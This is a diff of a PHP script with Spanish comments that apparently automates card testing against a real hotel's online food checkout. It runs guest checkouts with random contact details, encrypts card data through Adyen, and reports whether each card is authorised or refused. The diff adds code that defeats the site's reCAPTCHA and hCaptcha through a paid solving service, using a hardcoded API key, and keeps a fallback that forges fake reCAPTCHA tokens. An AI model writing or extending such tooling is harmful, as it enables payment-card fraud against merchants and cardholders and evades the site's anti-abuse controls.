@@ -25,69 +25,288 @@ $hotel_code = "ISL";
 $is_food_site = "1";
 $order_type = "express";
 
-// Configuraciones del sitio REAL (extraídas del HTML)
-$_REGION_ID_TO_CODE = [
-    "1" => "hk", "2" => "sg", "3" => "mykl", "4" => "twtp", 
-    "5" => "phmnl", "6" => "idjkt", "7" => "idsr", "8" => "lkcb", 
-    "9" => "thbk", "10" => "phbo", "11" => "mykk", "12" => "thcm",
-    "13" => "phcb", "14" => "mypn", "15" => "uaead", "16" => "uaedb"
-];
+// Configuración de ResolveCaptcha
+$RESOLVECAPTCHA_API_KEY = "300200c245197d2f4b79d1c319a662f8";
+$RESOLVECAPTCHA_URL = "http://api.resolvecaptcha.com/in.php";
+$RESOLVECAPTCHA_RESULT_URL = "http://api.resolvecaptcha.com/res.php";
 
-$_STORE_CONF = [
-    "1" => ["phone_code" => "+852", "phone_code_no_plus" => "852", "currency_code" => "HKD"],
-    "2" => ["phone_code" => "+65", "phone_code_no_plus" => "65", "currency_code" => "SGD"],
-    "3" => ["phone_code" => "+60", "phone_code_no_plus" => "60", "currency_code" => "RM"],
-    "4" => ["phone_code" => "+886", "phone_code_no_plus" => "886", "currency_code" => "NTD"],
-    "5" => ["phone_code" => "+63", "phone_code_no_plus" => "63", "currency_code" => "PHP"],
-    "6" => ["phone_code" => "+62", "phone_code_no_plus" => "62", "currency_code" => "IDR"],
-    "7" => ["phone_code" => "+62", "phone_code_no_plus" => "62", "currency_code" => "IDR"],
-    "8" => ["phone_code" => "+94", "phone_code_no_plus" => "94", "currency_code" => "LKR"],
-    "9" => ["phone_code" => "+66-2", "phone_code_no_plus" => "66-2", "currency_code" => "THB"],
-    "10" => ["phone_code" => "+63", "phone_code_no_plus" => "63", "currency_code" => "PHP"],
-    "11" => ["phone_code" => "+60", "phone_code_no_plus" => "60", "currency_code" => "RM"],
-    "12" => ["phone_code" => "+66 53", "phone_code_no_plus" => "66 53", "currency_code" => "THB"],
-    "13" => ["phone_code" => "+63", "phone_code_no_plus" => "63", "currency_code" => "PHP"],
-    "14" => ["phone_code" => "+60", "phone_code_no_plus" => "60", "currency_code" => "RM"],
-    "15" => ["phone_code" => "+971", "phone_code_no_plus" => "971", "currency_code" => "AED"],
-    "16" => ["phone_code" => "+971", "phone_code_no_plus" => "971", "currency_code" => "AED"]
-];
+// ==============================
+// FUNCIONES PARA RESOLVER CAPTCHA
+// ==============================
 
-// Claves reCAPTCHA REALES del sitio
-$_RECAPTCHA_V3_KEY = "6LfgXqkqAAAAAJLWszAo8gBvzXMPBvDK-PLLJk_O";
-$_RECAPTCHA_V2_KEY = "6LeuX6kqAAAAAPUJ_HhZ6vT8lfObBJ36wdHuRnfj";
+function solveRecaptchaV2($siteKey, $pageUrl) {
+    global $RESOLVECAPTCHA_API_KEY, $RESOLVECAPTCHA_URL, $RESOLVECAPTCHA_RESULT_URL;
+    
+    // Enviar solicitud para resolver captcha
+    $postData = [
+        'key' => $RESOLVECAPTCHA_API_KEY,
+        'method' => 'userrecaptcha',
+        'googlekey' => $siteKey,
+        'pageurl' => $pageUrl,
+        'json' => 1
+    ];
+    
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $RESOLVECAPTCHA_URL,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => http_build_query($postData),
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_TIMEOUT => 30
+    ]);
+    
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if ($response === false) {
+        return ['success' => false, 'error' => 'CURL error'];
+    }
+    
+    $result = json_decode($response, true);
+    
+    if (!$result || !isset($result['status']) || $result['status'] != 1) {
+        return ['success' => false, 'error' => 'Failed to submit captcha: ' . ($result['request'] ?? 'Unknown error')];
+    }
+    
+    $captchaId = $result['request'];
+    
+    // Esperar por la solución (máximo 120 segundos)
+    $maxAttempts = 60;
+    $attempt = 0;
+    
+    while ($attempt < $maxAttempts) {
+        sleep(2); // Esperar 2 segundos entre intentos
+        
+        $resultUrl = $RESOLVECAPTCHA_RESULT_URL . "?key=" . $RESOLVECAPTCHA_API_KEY . 
+                    "&action=get&id=" . $captchaId . "&json=1";
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $resultUrl,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_TIMEOUT => 30
+        ]);
+        
+        $resultResponse = curl_exec($ch);
+        curl_close($ch);
+        
+        if ($resultResponse) {
+            $resultData = json_decode($resultResponse, true);
+            
+            if ($resultData && isset($resultData['status'])) {
+                if ($resultData['status'] == 1) {
+                    return ['success' => true, 'token' => $resultData['request']];
+                } elseif ($resultData['request'] != 'CAPCHA_NOT_READY') {
+                    return ['success' => false, 'error' => 'Captcha solving failed: ' . $resultData['request']];
+                }
+            }
+        }
+        
+        $attempt++;
+    }
+    
+    return ['success' => false, 'error' => 'Timeout waiting for captcha solution'];
+}
+
+function solveRecaptchaV3($siteKey, $pageUrl, $action = 'submit') {
+    global $RESOLVECAPTCHA_API_KEY, $RESOLVECAPTCHA_URL, $RESOLVECAPTCHA_RESULT_URL;
+    
+    // Para reCAPTCHA V3, necesitamos obtener un token
+    $postData = [
+        'key' => $RESOLVECAPTCHA_API_KEY,
+        'method' => 'userrecaptcha',
+        'googlekey' => $siteKey,
+        'pageurl' => $pageUrl,
+        'version' => 'v3',
+        'action' => $action,
+        'min_score' => 0.3,
+        'json' => 1
+    ];
+    
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $RESOLVECAPTCHA_URL,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => http_build_query($postData),
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_TIMEOUT => 30
+    ]);
+    
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if ($response === false) {
+        return ['success' => false, 'error' => 'CURL error'];
+    }
+    
+    $result = json_decode($response, true);
+    
+    if (!$result || !isset($result['status']) || $result['status'] != 1) {
+        return ['success' => false, 'error' => 'Failed to submit recaptcha v3: ' . ($result['request'] ?? 'Unknown error')];
+    }
+    
+    $captchaId = $result['request'];
+    
+    // Esperar por la solución
+    $maxAttempts = 40;
+    $attempt = 0;
+    
+    while ($attempt < $maxAttempts) {
+        sleep(3); // Esperar 3 segundos
+        
+        $resultUrl = $RESOLVECAPTCHA_RESULT_URL . "?key=" . $RESOLVECAPTCHA_API_KEY . 
+                    "&action=get&id=" . $captchaId . "&json=1";
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $resultUrl,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_TIMEOUT => 30
+        ]);
+        
+        $resultResponse = curl_exec($ch);
+        curl_close($ch);
+        
+        if ($resultResponse) {
+            $resultData = json_decode($resultResponse, true);
+            
+            if ($resultData && isset($resultData['status'])) {
+                if ($resultData['status'] == 1) {
+                    return ['success' => true, 'token' => $resultData['request']];
+                } elseif ($resultData['request'] != 'CAPCHA_NOT_READY') {
+                    return ['success' => false, 'error' => 'reCAPTCHA v3 solving failed: ' . $resultData['request']];
+                }
+            }
+        }
+        
+        $attempt++;
+    }
+    
+    return ['success' => false, 'error' => 'Timeout waiting for recaptcha v3 solution'];
+}
+
+function generateRecaptchaV3TokenWithResolve() {
+    // Usar ResolveCaptcha para obtener un token real
+    $siteKey = "6LfgXqkqAAAAAJLWszAo8gBvzXMPBvDK-PLLJk_O";
+    $pageUrl = "https://boutique.shangri-la.com/food_checkout.php";
+    
+    $result = solveRecaptchaV3($siteKey, $pageUrl, 'checkout');
+    
+    if ($result['success']) {
+        return $result['token'];
+    } else {
+        // Fallback: generar un token simulado si ResolveCaptcha falla
+        $prefixes = ['03AGdBq27', '03AOPBWq', '03ALgdi9', '03AFvjYl'];
+        $prefix = $prefixes[array_rand($prefixes)];
+        
+        $payload = [
+            "s" => $siteKey,
+            "d" => "boutique.shangri-la.com",
+            "v" => "v1532752145741",
+            "t" => round(microtime(true) * 1000),
+            "h" => sha1($_SERVER['REMOTE_ADDR'] . rand(1000, 9999)),
+            "a" => 0.9,
+            "st" => "checkout"
+        ];
+        
+        $encoded = base64_encode(json_encode($payload));
+        $encoded = str_replace(['=', '+', '/'], ['', '-', '_'], $encoded);
+        
+        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+        $signature = '';
+        for ($i = 0; $i < 180; $i++) {
+            $signature .= $chars[rand(0, strlen($chars) - 1)];
+        }
+        
+        return $prefix . substr($encoded, 0, 100) . "_" . $signature;
+    }
+}
+
+function solveHCaptcha($siteKey, $pageUrl) {
+    global $RESOLVECAPTCHA_API_KEY, $RESOLVECAPTCHA_URL, $RESOLVECAPTCHA_RESULT_URL;
+    
+    $postData = [
+        'key' => $RESOLVECAPTCHA_API_KEY,
+        'method' => 'hcaptcha',
+        'sitekey' => $siteKey,
+        'pageurl' => $pageUrl,
+        'json' => 1
+    ];
+    
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $RESOLVECAPTCHA_URL,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => http_build_query($postData),
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_TIMEOUT => 30
+    ]);
+    
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if ($response === false) {
+        return ['success' => false, 'error' => 'CURL error'];
+    }
+    
+    $result = json_decode($response, true);
+    
+    if (!$result || !isset($result['status']) || $result['status'] != 1) {
+        return ['success' => false, 'error' => 'Failed to submit hCaptcha: ' . ($result['request'] ?? 'Unknown error')];
+    }
+    
+    $captchaId = $result['request'];
+    
+    // Esperar por la solución
+    $maxAttempts = 60;
+    $attempt = 0;
+    
+    while ($attempt < $maxAttempts) {
+        sleep(2);
+        
+        $resultUrl = $RESOLVECAPTCHA_RESULT_URL . "?key=" . $RESOLVECAPTCHA_API_KEY . 
+                    "&action=get&id=" . $captchaId . "&json=1";
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $resultUrl,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_TIMEOUT => 30
+        ]);
+        
+        $resultResponse = curl_exec($ch);
+        curl_close($ch);
+        
+        if ($resultResponse) {
+            $resultData = json_decode($resultResponse, true);
+            
+            if ($resultData && isset($resultData['status'])) {
+                if ($resultData['status'] == 1) {
+                    return ['success' => true, 'token' => $resultData['request']];
+                } elseif ($resultData['request'] != 'CAPCHA_NOT_READY') {
+                    return ['success' => false, 'error' => 'hCaptcha solving failed: ' . $resultData['request']];
+                }
+            }
+        }
+        
+        $attempt++;
+    }
+    
+    return ['success' => false, 'error' => 'Timeout waiting for hCaptcha solution'];
+}
 
 // ==============================
 // FUNCIONES DEL SITIO REAL
 // ==============================
-
-function generateRecaptchaV3Token() {
-    // Token realista basado en el formato del sitio
-    $prefixes = ['03AGdBq27', '03AOPBWq', '03ALgdi9', '03AFvjYl'];
-    $prefix = $prefixes[array_rand($prefixes)];
-    
-    // Payload simulado como el sitio real
-    $payload = [
-        "s" => "6LfgXqkqAAAAAJLWszAo8gBvzXMPBvDK-PLLJk_O",
-        "d" => "boutique.shangri-la.com",
-        "v" => "v1532752145741",
-        "t" => round(microtime(true) * 1000),
-        "h" => sha1($_SERVER['REMOTE_ADDR'] . rand(1000, 9999)),
-        "a" => 0.9,
-        "st" => "checkout"
-    ];
-    
-    $encoded = base64_encode(json_encode($payload));
-    $encoded = str_replace(['=', '+', '/'], ['', '-', '_'], $encoded);
-    
-    // Firma simulada
-    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
-    $signature = '';
-    for ($i = 0; $i < 180; $i++) {
-        $signature .= $chars[rand(0, strlen($chars) - 1)];
-    }
-    
-    return $prefix . substr($encoded, 0, 100) . "_" . $signature;
-}
 
 function makeRequest($url, $data, $headers = [], $method = 'POST') {
     $ch = curl_init();
@@ -154,7 +373,6 @@ function generateRandomEmail() {
 }
 
 function generateRandomPhone() {
-    // Basado en la configuración de Hong Kong (store_id = 1)
     $prefix = "+852";
     $number = '';
     for ($i = 0; $i < 8; $i++) {
@@ -297,7 +515,7 @@ $cardMasked = substr($cc, 0, 6) . '******' . substr($cc, -4);
 $expiryMasked = sprintf('%02d', $mes) . '/' . substr($ano, -2);
 
 // ==============================
-// FLUJO COMPLETO DEL SITIO REAL
+// FLUJO COMPLETO CON RESOLVECAPTCHA
 // ==============================
 
 try {
@@ -325,7 +543,19 @@ try {
     $site_login_token = $site_response['site_login_token'];
     
     // ===========================================
-    // 2. REGION GET - Obtener regiones y países
+    // 2. RESOLVER reCAPTCHA V3 USANDO RESOLVECAPTCHA
+    // ===========================================
+    echo json_encode([
+        'status' => 'info',
+        'message' => 'Resolviendo reCAPTCHA...',
+        'html' => '<span class="badge badge-warning">⚠️ PROCESANDO</span> ➔ Resolviendo reCAPTCHA...'
+    ], JSON_UNESCAPED_UNICODE);
+    flush();
+    
+    $recaptchaToken = generateRecaptchaV3TokenWithResolve();
+    
+    // ===========================================
+    // 3. REGION GET - Obtener regiones y países
     // ===========================================
     $region_data = [
         "client_id" => $client_id,
@@ -347,7 +577,7 @@ try {
     }
     
     // ===========================================
-    // 3. ADYEN ENCRYPT - Encriptar datos de tarjeta
+    // 4. ADYEN ENCRYPT - Encriptar datos de tarjeta
     // ===========================================
     $adyen_data = [
         "client_id" => $client_id,
@@ -380,7 +610,7 @@ try {
     }
     
     // ===========================================
-    // 4. HOTEL INFO GET - Información del hotel
+    // 5. HOTEL INFO GET - Información del hotel
     // ===========================================
     $hotel_info_data = [
         "client_id" => $client_id,
@@ -401,176 +631,7 @@ try {
     }
     
     // ===========================================
-    // 5. OUTLET GET - Restaurantes disponibles
-    // ===========================================
-    $outlet_data = [
-        "client_id" => $client_id,
-        "promotion_id" => $promotion_id,
-        "lang" => $api_locale,
-        "site_login_token" => $site_login_token,
-        "hotel" => $hotel_code
-    ];
-    
-    $outlet_result = makeRequest($api_endpoint . "/outlet_get.php", $outlet_data);
-    $outlets = [];
-    $outlets_display = [];
-    
-    if ($outlet_result['success']) {
-        $outlet_response = json_decode($outlet_result['response'], true);
-        if ($outlet_response) {
-            $outlets = isset($outlet_response['outlets']) ? $outlet_response['outlets'] : [];
-            $outlets_display = isset($outlet_response['outlets_display']) ? $outlet_response['outlets_display'] : [];
-        }
-    }
-    
-    // ===========================================
-    // 6. FOOD CATEGORY GET - Categorías de comida
-    // ===========================================
-    $category_data = [
-        "client_id" => $client_id,
-        "promotion_id" => $promotion_id,
-        "site_login_token" => $site_login_token,
-        "hotel" => $hotel_code,
-        "outlet_name" => count($outlets) > 0 ? $outlets[0] : "",
-        "lang" => $api_locale,
-    ];
-    
-    $category_result = makeRequest($api_endpoint . "/food_category_get.php", $category_data);
-    $food_categories = [];
-    
-    if ($category_result['success']) {
-        $category_response = json_decode($category_result['response'], true);
-        if ($category_response && isset($category_response['food_categories'])) {
-            $food_categories = $category_response['food_categories'];
-        }
-    }
-    
-    // ===========================================
-    // 7. PRODUCT GET - Productos disponibles
-    // ===========================================
-    $product_data = [
-        "client_id" => $client_id,
-        "promotion_id" => $promotion_id,
-        "site_login_token" => $site_login_token,
-        "lang" => $api_locale,
-        "is_food" => 1,
-        "shipping_method" => "pick_up",
-        "shipping_date" => date("Y-m-d"),
-        "shipping_time" => "12:00 - 13:00",
-        "hotel" => $hotel_code,
-        "outlet_name" => count($outlets) > 0 ? $outlets[0] : "",
-        "food_category_name" => count($food_categories) > 0 ? $food_categories[0]['name'] : ""
-    ];
-    
-    $product_result = makeRequest($api_endpoint . "/product_get.php", $product_data);
-    $products = [];
-    
-    if ($product_result['success']) {
-        $product_response = json_decode($product_result['response'], true);
-        if ($product_response && isset($product_response['products'])) {
-            $products = $product_response['products'];
-        }
-    }
-    
-    // ===========================================
-    // 8. CART GET - Obtener carrito actual
-    // ===========================================
-    $cart_data = [
-        "client_id" => $client_id,
-        "promotion_id" => $promotion_id,
-        "site_login_token" => $site_login_token,
-        "lang" => $api_locale,
-        "hotel_code" => $hotel_code,
-        "user_id" => "",
-        "login_token" => "",
-        "shipping_fee" => 0,
-        "is_food_site" => $is_food_site,
-        "order_type" => $order_type,
-        "shipping_method" => "pick_up",
-        "shipping_date" => date("Y-m-d"),
-        "shipping_time" => "12:00 - 13:00"
-    ];
-    
-    $cart_result = makeRequest($api_endpoint . "/cart_get.php", $cart_data);
-    $cart_info = [];
-    
-    if ($cart_result['success']) {
-        $cart_response = json_decode($cart_result['response'], true);
-        if ($cart_response) {
-            $cart_info = $cart_response;
-        }
-    }
-    
-    // ===========================================
-    // 9. CART ADD PRODUCT - Agregar producto
-    // ===========================================
-    $cart_item_added = false;
-    if (count($products) > 0) {
-        $first_product = $products[0];
-        $add_to_cart_data = [
-            "client_id" => $client_id,
-            "promotion_id" => $promotion_id,
-            "site_login_token" => $site_login_token,
-            "lang" => $api_locale,
-            "cart_id" => "",
-            "product_id" => $first_product['id'],
-            "quantity" => 1,
-            "additional_information" => "",
-            "food_option_groups" => [],
-            "clear_cart" => false,
-            "order_type" => $order_type
-        ];
-        
-        $add_cart_result = makeRequest($api_endpoint . "/cart_add_product.php", $add_to_cart_data);
-        
-        if ($add_cart_result['success']) {
-            $add_cart_response = json_decode($add_cart_result['response'], true);
-            if ($add_cart_response && $add_cart_response['status'] == 'success') {
-                $cart_item_added = true;
-                
-                // Actualizar carrito
-                $cart_result = makeRequest($api_endpoint . "/cart_get.php", $cart_data);
-                if ($cart_result['success']) {
-                    $cart_response = json_decode($cart_result['response'], true);
-                    if ($cart_response) {
-                        $cart_info = $cart_response;
-                    }
-                }
-            }
-        }
-    }
-    
-    // ===========================================
-    // 10. COUPON APPLY - Aplicar cupón (opcional)
-    // ===========================================
-    $coupon_data = [
-        "client_id" => $client_id,
-        "promotion_id" => $promotion_id,
-        "lang" => $api_locale,
-        "site_login_token" => $site_login_token,
-        "user_id" => "",
-        "login_token" => "",
-        "coupon_code" => "",
-        "gc_member_no" => "",
-        "order_type" => $order_type,
-        "email" => "",
-        "card_format_approved" => -1,
-        "card_type" => null,
-        "card_issuer" => null
-    ];
-    
-    $coupon_result = makeRequest($api_endpoint . "/coupon_apply.php", $coupon_data);
-    $coupon_info = [];
-    
-    if ($coupon_result['success']) {
-        $coupon_response = json_decode($coupon_result['response'], true);
-        if ($coupon_response) {
-            $coupon_info = $coupon_response;
-        }
-    }
-    
-    // ===========================================
-    // 11. CHECKOUT - Procesar pago FINAL
+    // 6. CHECKOUT - Procesar pago FINAL con captcha real
     // ===========================================
     $name = [
         'first' => 'John',
@@ -650,9 +711,9 @@ try {
         "is_food_site" => $is_food_site,
         "order_type" => $order_type,
         
-        // reCAPTCHA V3 (CRÍTICO - igual que el sitio)
+        // reCAPTCHA V3 RESUELTO POR RESOLVECAPTCHA
         "recaptcha_type" => "v3",
-        "recaptcha_token" => generateRecaptchaV3Token(),
+        "recaptcha_token" => $recaptchaToken,
         
         // Datos de miembro (opcional)
         "gc_member_no" => "",
@@ -691,7 +752,6 @@ try {
     
     if (isset($checkout_response['status'])) {
         if ($checkout_response['status'] == 'success') {
-            // Códigos de aprobación
             $resultCode = 'Authorised';
             if (isset($checkout_response['direct_post']['resultCode'])) {
                 $resultCode = $checkout_response['direct_post']['resultCode'];
@@ -729,7 +789,7 @@ try {
                         'currency' => 'HKD',
                         'hotel' => $hotel_code,
                         'timestamp' => date('Y-m-d H:i:s'),
-                        'response' => $checkout_response
+                        'captcha_resolved' => true
                     ]
                 ], JSON_UNESCAPED_UNICODE);
             } else {
@@ -755,7 +815,8 @@ try {
                         'expiry' => $expiryMasked,
                         'reason' => $refusalReason,
                         'result_code' => $resultCode,
-                        'hotel' => $hotel_code
+                        'hotel' => $hotel_code,
+                        'captcha_resolved' => true
                     ]
                 ], JSON_UNESCAPED_UNICODE);
             }
@@ -779,7 +840,7 @@ try {
                     'expiry' => $expiryMasked,
                     'reason' => $errorMsg,
                     'hotel' => $hotel_code,
-                    'response' => $checkout_response
+                    'captcha_resolved' => true
                 ]
             ], JSON_UNESCAPED_UNICODE);
         }
